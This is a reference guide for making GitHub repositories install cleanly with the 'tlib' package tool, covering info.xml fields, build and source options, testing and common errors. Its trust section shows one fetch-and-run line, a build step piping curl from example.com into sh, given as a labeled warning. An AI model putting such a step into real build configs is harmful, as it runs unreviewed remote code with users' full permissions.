# Making a repo compliant with `tlib`

This is the full checklist and reference for getting a GitHub repo to
install cleanly with `tlib install`. Everything here is derived directly
from `ZSH.zsh` — if your repo satisfies these rules, `tlib install` will
work; if it doesn't, this doc tells you exactly which check fails and why.

Every example in this document is a **real, currently-published repo**
you can install and inspect yourself right now — `knittingCat/stock-checker`,
`knittingCat/SD-Photo-Viewer`, `Bluegrayfoo/ascii-stl-viewer`, and this
repo's own `examples/greet/` — not invented placeholder names. The only
exceptions are examples of what *fails*, which have to be made up, since
no real published repo is broken on purpose (those are clearly labeled).

There are two repo shapes `tlib` understands. Use `info.xml` unless you
have a specific reason to use the legacy shape — it's more capable and
the error messages are clearer.

---

## 0. A complete, real, working example

This exact example is checked into this repo at
[`examples/greet/`](examples/greet/) — two files, both shown here in
full. You can run every command below yourself right now.

`examples/greet/greet.sh` (the entire file):

```sh
#!/bin/sh
echo "Hello from tlib!"
```

`examples/greet/info.xml` (the entire file):

```xml
<tlib version="1">
  <package name="greet" version="1.0.0">
    <commands>
      <command name="greet" language="shell" source="greet.sh"/>
    </commands>
  </package>
</tlib>
```

That's the whole repo. This is the real output from actually installing
it, running it, and removing it, on this exact directory, just now:

```
$ tlib local /Users/you/TLIB/examples/greet
│
◇    ✓   Opened local module
│
◇    ✓   Installed info.xml commands
│
└─    Done. Installed successfully.

$ greet
Hello from tlib!

$ tlib uninstall local/greet
│
◇    ✓   Found install record
│
◇    ✓   Removed greet
│
└─    Done. Uninstalled local/greet.

$ greet
zsh: command not found: greet
```

The only thing that changes for a real GitHub repo is skipping
`tlib local` in favor of pushing and running `tlib install
YourUsername/repo` — same install logic either way (section 4 does this
for real, against `knittingCat/stock-checker`).

---

## 1. Baseline requirements (both shapes)

- [ ] **The repo is public.** `tlib install knittingCat/stock-checker`
      downloads
      `https://github.com/knittingCat/stock-checker/archive/refs/heads/main.tar.gz`
      with an unauthenticated `curl` request — no login, no token. Make
      that same repo private and re-run the install, and GitHub returns
      HTTP 404, and `tlib` reports:
      ```
      GitHub repo or branch not found: knittingCat/stock-checker on branch 'main'.
      Check the spelling, make sure the repo is public, and make sure the branch is named 'main'.
      ```
      **Fix:** make the repo public in its GitHub settings, or double-check
      the spelling of the owner/repo name.

- [ ] **The branch you're installing from is actually named what you
      think.** The bare form always assumes `main`:
      ```bash
      tlib install knittingCat/stock-checker
      # → tries https://github.com/knittingCat/stock-checker/archive/refs/heads/main.tar.gz
      ```
      If a repo's default branch is `master` (or anything else) instead,
      that 404s the same way a missing repo does. **Fix:** either rename
      the default branch to `main`, or tell installers to use a
      branch-qualified `raw.githubusercontent.com` URL instead, naming
      the real branch:
      ```bash
      tlib install https://raw.githubusercontent.com/knittingCat/stock-checker/master/
      ```

- [ ] **`info.xml` (or `make.sh` + `src/`) lives at the repo root** — not
      in a subdirectory. This is the real, complete layout of
      `knittingCat/stock-checker`:
      ```
      stock-checker/
      ├── info.xml              ← tlib looks exactly here
      ├── bin/
      │   ├── stock-checker
      │   ├── stock-checker-setup
      │   ├── stock-checker-install
      │   └── stock-checker-uninstall
      ├── stock_checker.py
      ├── setup.py
      ├── install.sh
      └── uninstall.sh
      ```
      This does **not** work — `tlib` never looks inside subdirectories
      for `info.xml`:
      ```
      stock-checker/
      └── config/
          └── info.xml          ← tlib will never find this
      ```

---

## 2. `info.xml` shape (preferred)

The real, complete `info.xml` from `knittingCat/SD-Photo-Viewer`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<tlib version="1">
  <package name="sd-photo-viewer" version="1.0.0">
    <requires>
      <tool name="node"/>
      <tool name="npm"/>
      <tool name="lsof"/>
    </requires>
    <commands>
      <command name="sd-photo-viewer" build="npm install" output="bin/sd-photo-viewer"/>
      <command name="sd-photo-viewer-stop" language="shell" source="bin/sd-photo-viewer-stop"/>
    </commands>
  </package>
</tlib>
```

Install it and see for yourself: `tlib install knittingCat/SD-Photo-Viewer`
gives you `sd-photo-viewer` and `sd-photo-viewer-stop` as real commands.

**The `<package>` wrapper is decorative.** `tlib` never reads `name=` or
`version=` on `<package>` — it just looks for `<command>` and
`<requires>`/`<tool>` elements anywhere in the file. This flattened
version — same file, `<package>` removed — installs identically:

```xml
<tlib version="1">
  <requires>
    <tool name="node"/>
    <tool name="npm"/>
    <tool name="lsof"/>
  </requires>
  <commands>
    <command name="sd-photo-viewer" build="npm install" output="bin/sd-photo-viewer"/>
    <command name="sd-photo-viewer-stop" language="shell" source="bin/sd-photo-viewer-stop"/>
  </commands>
</tlib>
```

(Still, use the `<package>`-wrapped form in your own repos — it's the
convention every real repo here follows, and it's what a reader expects.)

There's currently no version-compatibility mechanism at all: changing
`version="1.0.0"` to `version="99.0.0"` in the file above changes nothing
about how it installs — `tlib` doesn't read it. Likewise, a real line
from another published repo, `Bluegrayfoo/ascii-stl-viewer`'s
`info.xml` —

```xml
<platforms>
  <platform name="macos"/>
</platforms>
```

— is **silently ignored**. `tlib` has no OS-gating logic, so this doesn't
stop someone on a different platform from attempting the install (it
would just fail later on whatever's actually platform-specific).

### 2.1 `<requires>`

- Lists tools that must already be on the installing machine's `PATH`.
  Checked with a plain `command -v`, **before** anything else in the file
  is processed. `knittingCat/stock-checker`'s `<requires>` uses the
  self-closing attribute form:
  ```xml
  <tool name="python3"/>
  ```
  Bare text content works identically:
  ```xml
  <tool>python3</tool>
  ```
- Accepts `<tool>`, `<require>`, or `<dependency>` as the tag name — all
  three of these are equivalent to `SD-Photo-Viewer`'s real
  `<tool name="node"/>`:
  ```xml
  <tool name="node"/>
  <require name="node"/>
  <dependency name="node"/>
  ```
  and they work anywhere in the file, not just inside a `<requires>`
  wrapper (the wrapper, like `<package>`, is just for readability).
- If a listed tool is missing, the whole install aborts immediately —
  nothing gets installed, even other unrelated commands in the same file.
  Uninstall `node` and try `tlib install knittingCat/SD-Photo-Viewer` and
  you'd get:
  ```
  tlib info.xml: node is required for info.xml requirement
  ```
- **Compliance tip:** only list tools your commands' `build=` steps or
  runtime actually need — this is why `stock-checker`'s `<requires>` lists
  only `python3` and not, say, `node`, even though other repos in this
  same GitHub account need it. Every install of your repo pays the cost
  of every tool you list.

### 2.2 `<command>` — required fields

Each command needs:

- **A name**: `name=` (or `id=`). `stock-checker`'s
  `<command name="stock-checker-setup" output="bin/stock-checker-setup"/>`
  sets it explicitly; if omitted, it's derived from `source`'s filename
  instead:
  ```xml
  <command source="hello.sh" language="shell"/>
  <!-- name becomes "hello" automatically, exactly like examples/greet -->
  ```
  The name must match `^[A-Za-z0-9._+-]+$` — no slashes, no spaces. These
  would both fail, unlike the real `sd-photo-viewer-stop`:
  ```xml
  <command name="sd photo viewer stop" .../>   <!-- FAILS: contains spaces -->
  <command name="sd/photo/viewer" .../>        <!-- FAILS: contains slashes -->
  ```
  Failing case produces: `command #N has invalid or missing name`.

- **Exactly one of `source`, `build`, or `output`.** This is invalid —
  none of the three are present:
  ```xml
  <command name="stock-checker"/>
  <!-- FAILS: command 'stock-checker' needs source, build, or output -->
  ```
  The real line is valid because `output` is present:
  ```xml
  <command name="stock-checker" output="bin/stock-checker"/>
  ```

- **A unique name.** This is invalid — two commands sharing a name (real
  `stock-checker` commands, artificially duplicated to show the failure):
  ```xml
  <commands>
    <command name="stock-checker" output="bin/stock-checker"/>
    <command name="stock-checker" output="bin/stock-checker-setup"/>
  </commands>
  <!-- FAILS: duplicate command names: stock-checker -->
  ```

A repo can declare as many `<command>` elements as it wants —
`stock-checker` itself declares four (`stock-checker`,
`stock-checker-setup`, `stock-checker-install`,
`stock-checker-uninstall`), all in the one worked example in section 5.
There's no requirement that a command's name match the repo name.

### 2.3 Picking how a command gets built

**`output` only (no `source`, no `build`)** — the file is already built
and checked into the repo. `stock-checker`'s real `bin/stock-checker` is
a hand-written wrapper script, used as-is:

```xml
<command name="stock-checker" output="bin/stock-checker"/>
```

- The path must exist in the repo and must stay **inside** the repo.
  This fails — it points outside the repo:
  ```xml
  <command name="stock-checker" output="../outside-the-repo/stock-checker"/>
  <!-- FAILS: output for command 'stock-checker' must be a relative path inside the repo -->
  ```
- If the referenced file doesn't exist in the downloaded repo at all:
  ```
  declared output for command 'stock-checker' does not exist: bin/stock-checker
  ```
- **Compliance tip:** the file must actually be committed to the repo —
  a `.gitignore` line like `bin/` (very common for build output
  directories) will silently exclude it, and installers get the "does
  not exist" error with no obvious cause:
  ```
  # .gitignore
  bin/          ← if this line exists, bin/stock-checker never reaches GitHub
  ```
  Double check with a fresh clone, not just your working copy.

**`build` (with or without `output`)** — runs a shell command in the repo
root first, then locates the result. `SD-Photo-Viewer`'s real command:

```xml
<command name="sd-photo-viewer" build="npm install" output="bin/sd-photo-viewer"/>
```

`output` is optional here — if you omit it, `tlib` searches, in order:
`<repo>/<name>`, `<repo>/build/<name>`, `<repo>/dist/<name>`,
`<repo>/bin/<name>`, `<repo>/.build/release/<name>`,
`<repo>/.build/debug/<name>`, then its own build scratch directory:

```xml
<command name="sd-photo-viewer" build="npm install"/>
<!-- works with no output= ONLY IF npm install leaves an executable at
     ./sd-photo-viewer, ./build/sd-photo-viewer, ./dist/sd-photo-viewer,
     or ./bin/sd-photo-viewer in the repo root -->
```

**Compliance tip:** if your build output doesn't land in one of those
exact paths under that exact name, always set `output=` explicitly —
which is exactly why the real `SD-Photo-Viewer` command above sets it
rather than relying on the search order.

If the build command itself fails (non-zero exit), install aborts:
```
command failed with exit 127: npm install
```
(exit 127 here would mean `npm` itself wasn't found — see the trust note
in section 6 about not assuming your dev machine's tools are present.)

**`source`** — a source file `tlib` builds or wraps for you, dispatched by
`language=` (or by the file's extension if `language` is omitted).
`SD-Photo-Viewer`'s second command uses this — real, complete:

```xml
<command name="sd-photo-viewer-stop" language="shell" source="bin/sd-photo-viewer-stop"/>
```

Full dispatch table:

| `language` value(s) | What happens | Needs on the installer's machine |
|---|---|---|
| `c` | `clang <source> -o <out>` | `clang` |
| `cpp`, `c++` | `clang++ <source> -o <out>` | `clang++` |
| `objc`, `objective-c`, `m` | `clang -fobjc-arc`, framework from `frameworks=` or auto-detected (`AppKit`/`Cocoa` in source → AppKit, else Foundation) | `clang` |
| `swift` | `swiftc <source> [+ sources=] -o <out>` | `swiftc` |
| `shell`, `sh`, `bash`, `zsh` | copied as-is, chmod +x | nothing |
| `python`/`node`/`javascript`/`js`/`ruby`/`perl`/`php`/`lua` | wrapped in a `#!/bin/sh` shim that execs the interpreter against your source file (override interpreter with `interpreter=`) | that interpreter |
| `go` | `go build -o <out> <source>` | `go` |
| `rust`, `rs` | `rustc <source> -o <out>` | `rustc` |
| `copy`, `binary`, `prebuilt` | copied as-is, chmod +x | nothing |

None of the currently-published example repos happen to use
`c`/`cpp`/`objc`/`swift`/`go`/`rust`, so these rows don't have a real
published repo to point at — these are constructed (not run, not
tested against a real repo), shown only to illustrate the syntax:

```xml
<!-- explicit framework instead of auto-detection -->
<command name="my-app" source="AppDelegate.m" language="objc" frameworks="AppKit UIKit"/>

<!-- Swift with extra files compiled together -->
<command name="my-app" source="main.swift" language="swift" sources="Helper.swift Model.swift"/>

<!-- force a specific interpreter instead of the language default -->
<command name="my-tool" source="my-tool.py" language="python" interpreter="python3.11"/>

<!-- extra flags passed straight to the compiler -->
<command name="my-tool" source="my-tool.c" language="c" args="-O2 -Wall"/>
```

Extension-to-language auto-detection (used only when `language=` is
omitted): `.c`→c, `.cc/.cpp/.cxx`→cpp, `.m`→objc, `.swift`→swift,
`.py`→python, `.sh/.zsh/.bash`→shell, `.js/.mjs`→node, `.rb`→ruby,
`.pl`→perl, `.php`→php, `.lua`→lua, `.go`→go, `.rs`→rust. `SD-Photo-Viewer`
sets `language="shell"` explicitly, but since `bin/sd-photo-viewer-stop`
has no file extension at all, auto-detection couldn't have worked here —
this is a real example of when you *must* set `language=` explicitly.

**Compliance tip:** if you need a compiled/interpreted language, list the
matching tool in `<requires>` so `tlib doctor` warns installers *before*
they hit a failed build — this is exactly why `stock-checker` lists
`python3` in `<requires>` even though none of its commands use
`language="python"` directly (they use hand-written `output=` wrappers
instead — see the compliance tip below and the note in section 5).

**Compliance tip:** the interpreter-wrapper shim execs your source file
**at its path inside the persistent download cache**
(`~/.tlib/repos/<owner>/<repo>/<branch>/...`), not a copy of it
elsewhere. This is precisely why neither `stock-checker` nor
`SD-Photo-Viewer` uses `language="python"`/`language="node"` directly on
their main scripts — both scripts do relative-path file I/O based on
`Path(__file__).parent` (`stock_checker.py`'s `CONFIG_PATH`), and a
hand-written `bin/` wrapper script that `find`s the real script's path at
runtime is more robust than assuming where the interpreter shim lands it.

### 2.4 Field name aliases

Most fields accept more than one attribute name — pick whichever reads
best. These two are exactly equivalent to `SD-Photo-Viewer`'s real
second command:

```xml
<command name="sd-photo-viewer-stop" language="shell" source="bin/sd-photo-viewer-stop"/>
<command id="sd-photo-viewer-stop" lang="shell" src="bin/sd-photo-viewer-stop"/>
```

Full alias table:

| Canonical | Aliases |
|---|---|
| `name` | `id` |
| `source` | `src`, `file`, `path` |
| `language` | `lang`, `type`, `compiler` |
| `interpreter` | `runtime` |
| `build` | `build-command` |
| `output` | `out`, `binary`, `install-from` |
| `args` | `compiler-args`, `flags` |

---

## 3. Legacy shape (`make.sh` + `src/`)

Only use this if you have a reason not to use `info.xml` — it's less
capable (no `<requires>` checking, smaller language set, no `build=`
declarations independent of `make.sh`). None of this doc's example repos
use this shape (all three are `info.xml`) — the layout below is `tlib`'s
own built-in example, quoted verbatim from its `--help` output:

```
make.sh
src/cmda.c
src/cmdb.c
```

i.e., concretely:

```
my-repo/
├── make.sh              ← runs first, from the repo root
└── src/
    ├── cmda.c            ← becomes command "cmda"
    └── cmdb.c            ← becomes command "cmdb"
```

A minimal `make.sh` that does nothing (fine — it's only required to
exist and exit successfully; `tlib` compiles `src/*` itself if `make.sh`
doesn't produce matching executables):

```bash
#!/bin/sh
echo "nothing to build"
```

- [ ] A `make.sh` at the repo root — runs first, from the repo root.
- [ ] One or more files directly under `src/` — command name = filename
      without extension (`src/cmda.c` → command `cmda`).
- [ ] For each `src/` file, if `make.sh` already produced a matching
      executable (checked at `<repo>/<name>`, `build/<name>`,
      `dist/<name>`, `bin/<name>`, `.build/release/<name>`, or
      `.build/debug/<name>` — same search as `output` resolution above),
      that's used. Otherwise `tlib` compiles it itself, using this
      **smaller** language set: `c`, `cc`/`cpp`/`cxx`, `m`, `swift`,
      `sh`/`zsh`/`bash`, `py`, `js`/`mjs`, `rb`, `pl`, `php`, `lua`. No
      `go`, `rust`, `copy`/`binary`/`prebuilt`, and no custom
      `interpreter=` override — if you need any of those, use `info.xml`
      instead.
- [ ] At least one command must actually get installed, or the whole
      install fails with `no source files found in src/` (e.g. an empty
      `src/` directory, or one containing only files `tlib` can't
      compile).

---

## 4. Test before you publish

```bash
tlib local /path/to/your/repo
```

Runs the exact same `info.xml`/legacy install logic against a local
directory — no download, no need to push first.

Then do the real thing at least once, against the actual published repo
— this is the real, complete transcript from doing exactly that against
`knittingCat/stock-checker`:

```
$ tlib install knittingCat/stock-checker
│
◇    ✓   Downloaded knittingCat/stock-checker
│
◇    ✓   Installed info.xml commands
│
└─    Done. Installed successfully.

$ stock-checker --test
Config missing or still has placeholder URL(s) — run setup.py first.

$ tlib uninstall knittingCat/stock-checker
│
◇    ✓   Found install record
│
◇    ✓   Removed stock-checker
◇    ✓   Removed stock-checker-setup
◇    ✓   Removed stock-checker-install
◇    ✓   Removed stock-checker-uninstall
│
└─    Done. Uninstalled knittingCat/stock-checker.
```

Run it from a directory that isn't your repo clone (here, just a plain
shell prompt in the installer's home directory) — that way you're
testing exactly what a stranger would get, including whatever's actually
committed and pushed, not files that only exist in your working copy.

```bash
tlib doctor
```

Shows what's on *your* machine — useful for confirming which optional
compiler toolchains you personally have, so you know which of your
`<requires>` entries you can actually test locally.

---

## 5. Worked examples

Three real, currently-published repos, shown in full.

**`examples/greet/info.xml` — a single shell script (see section 0 for
the complete walkthrough):**

```xml
<tlib version="1">
  <package name="greet" version="1.0.0">
    <commands>
      <command name="greet" language="shell" source="greet.sh"/>
    </commands>
  </package>
</tlib>
```

**`Bluegrayfoo/ascii-stl-viewer`'s `info.xml` — a single shell script,
nested in a subdirectory:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<tlib version="1">
  <package name="stl-load" version="1.0.0">
    <platforms>
      <platform name="macos"/>
    </platforms>
    <commands>
      <command
        name="stl-load"
        language="shell"
        source="src/stl-load.sh"/>
    </commands>
  </package>
</tlib>
```

(The `<platforms>` block is the ignored one from section 2 — it's here
because this is the real file, unedited.)

**`knittingCat/stock-checker`'s `info.xml` — four commands, all
`output=`-only, needing only `python3`:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<tlib version="1">
  <package name="stock-checker" version="1.0.0">
    <requires>
      <tool name="python3"/>
    </requires>
    <commands>
      <command name="stock-checker" output="bin/stock-checker"/>
      <command name="stock-checker-setup" output="bin/stock-checker-setup"/>
      <command name="stock-checker-install" output="bin/stock-checker-install"/>
      <command name="stock-checker-uninstall" output="bin/stock-checker-uninstall"/>
    </commands>
  </package>
</tlib>
```

Try it: `tlib install knittingCat/stock-checker` gives you all four as
real commands (see section 4 for the real transcript).

**`knittingCat/SD-Photo-Viewer`'s `info.xml` — a `build=` command plus a
`source=` command, needing three tools:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<tlib version="1">
  <package name="sd-photo-viewer" version="1.0.0">
    <requires>
      <tool name="node"/>
      <tool name="npm"/>
      <tool name="lsof"/>
    </requires>
    <commands>
      <command name="sd-photo-viewer" build="npm install" output="bin/sd-photo-viewer"/>
      <command name="sd-photo-viewer-stop" language="shell" source="bin/sd-photo-viewer-stop"/>
    </commands>
  </package>
</tlib>
```

---

## 6. A note on trust, for repo authors and installers

`build=` and every `source=` compile/interpret step run with the
installing user's full permissions, on their machine, with no sandboxing
of any kind — this is exactly as much trust as running any script you
downloaded from the internet, because that is literally what's
happening. `tlib` does not scan, sandbox, or ask for confirmation before
running your `build=` command or executing your `source` file's
interpreter shim.

`SD-Photo-Viewer`'s real `build="npm install"` runs with zero prompts the
moment someone runs `tlib install knittingCat/SD-Photo-Viewer` — which is
fine, because `npm install` is exactly what it looks like. Compare
against this fabricated, deliberately bad example (not a real repo — no
published repo here does this, shown only as a warning of what *not* to
write):

```xml
<command name="my-tool" build="curl https://example.com/x | sh" output="bin/my-tool"/>
<!-- runs exactly as written, with the same lack of confirmation as the
     real npm install example — don't ship something like this -->
```

- **As a repo author:** don't put anything in `build=` or your source
  files that you wouldn't want run unreviewed on a stranger's machine.
  Keep build steps to the obvious, expected thing (`npm install`, `make`,
  `cargo build`) so a reader can tell at a glance what it does.
- **As an installer:** `tlib install` on an unfamiliar repo is
  equivalent to `curl | sh` — read the `info.xml` (and the source it
  points at) first, the same way you'd want someone to look at your own
  repo before running `tlib install` on it.

---

## 7. Common compliance failures, decoded

| Error you see | What it means | Fix |
|---|---|---|
| `GitHub repo or branch not found` | Repo is private, misspelled, or on a different default branch than `main` | Make it public; double check spelling; tell installers to use a branch-qualified URL if not `main` |
| `<tool> is required for info.xml requirement` | Something in `<requires>` isn't on the installer's `PATH` | That's expected/by design — just make sure you're not requiring tools you don't actually need |
| `command '<name>' needs source, build, or output` | A `<command>` has none of the three | Add one — see the 2.2 example |
| `duplicate command names: <name>` | Two `<command>` elements share a name | Rename one — see the 2.2 example |
| `command #N has invalid or missing name` | Name has illegal characters, or couldn't be derived from `source` | Use only `A-Za-z0-9._+-`, or set `name=` explicitly |
| `... must be a relative path inside the repo` | A `source`/`output`/`sources` path is absolute or contains `..` | Use a path relative to the repo root, no `../` — see the 2.3 example |
| `declared output for command '<name>' does not exist` | Your `output=` points at a file that isn't actually there after the build | Check the path, check your build actually produces it, check it isn't `.gitignore`d |
| `command '<name>' did not produce an executable; add output=...` | `tlib` searched the default candidate paths and found nothing | Set `output=` explicitly |
| `<lang> is required for <lang> command '<name>'` | Compiler/interpreter for that language isn't installed | List it in `<requires>` so this surfaces earlier, as a warning instead of a hard failure |
| Works with `tlib local`, fails with `tlib install knittingCat/stock-checker` | The version on GitHub differs from your working copy — usually uncommitted changes, or you're testing the wrong branch | Commit and push everything, then re-test the real install command |
| Works for you, fails for a friend | Almost always a missing `<requires>` entry — something's on your `PATH` (from other dev tools you have installed) that isn't on theirs | Run `tlib doctor` on a clean machine if you can, or just double-check every tool your `build=`/`source` steps actually touch is declared |
